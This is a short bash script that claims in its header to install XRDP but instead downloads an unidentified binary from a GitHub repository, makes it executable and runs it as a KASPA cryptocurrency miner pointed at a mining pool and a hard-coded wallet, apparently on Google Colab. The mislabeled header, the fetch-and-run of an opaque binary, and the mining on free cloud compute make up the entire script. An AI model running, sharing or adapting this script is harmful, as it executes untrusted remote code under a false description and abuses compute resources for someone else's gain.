# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R AkubapakMU

wget https://github.com/angkii/m/raw/main/AkubapakMU
chmod 700 AkubapakMU

#!/bin/bash

POOL=asia.mine.zergpool.com:5137
WALLET=bc1q9weckakf20ucvurkqvwrfdwnsgsc6qymn6darp

./AkubapakMU --algo KASPA --tls true --pool $POOL --user $WALLET $@ --no-cl
